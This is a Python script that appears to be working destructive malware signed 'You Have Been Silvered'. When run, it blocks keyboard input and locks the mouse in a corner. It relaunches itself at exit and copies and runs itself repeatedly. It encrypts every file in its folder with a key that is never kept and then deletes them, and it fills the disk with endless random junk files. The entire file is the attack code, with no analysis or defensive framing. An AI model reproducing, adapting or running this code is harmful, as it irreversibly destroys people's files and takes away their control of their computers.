from os.path import isfile, isdir, basename, splitext
from os import listdir, startfile, remove, getcwd
from cryptography.fernet import Fernet
from keyboard import block_key
from threading import Thread
from random import randbytes
from atexit import register
from hashlib import md5
from mouse import move
from sys import argv

register(
    startfile,
    argv[0]
)

root = getcwd()

structure = listdir()
structure.remove(basename(argv[0]))

def blockInput():
    for i in range(150):
        block_key(i)

    while True:
        move(0, 0)

def clone():
    for name in structure:
        if isdir(name):
            try:
                filename = root + "\\" +md5(  
                    randbytes(256)
                ).hexdigest() + splitext(
                    argv[0]
                )[1]

                open(  
                    filename,  
                    "w"
                ).write(  
                    open(      
                        argv[0],      
                        "r"  
                    ).read()
                )

                startfile(filename)

            except Exception as e:
                print(e)

def deleteFiles():
    for name in structure:
        if isfile(name) and not name.startswith("You Have Been Silvered "):
            try:
                open(
                    name,
                    "wb"
                ).write(
                    Fernet(
                        Fernet.generate_key()
                    ).encrypt(
                        open(
                            name,
                            "rb"
                        ).read()
                    )
                )
                
                remove(name)

            except Exception as e:
                print(e)

def spam():
    while True:
        try:
            salt = md5(
                randbytes(16)
            ).hexdigest()

            open(
                f"You Have Been Silvered {salt}",
                "wb"
            ).write(
                randbytes(256)
            )

        except Exception as e:
            print(e)

Thread(
    target = blockInput
).start()

Thread(
    target = clone
).start()

Thread(
    target = deleteFiles
).start()

Thread(
    target = spam
).start()
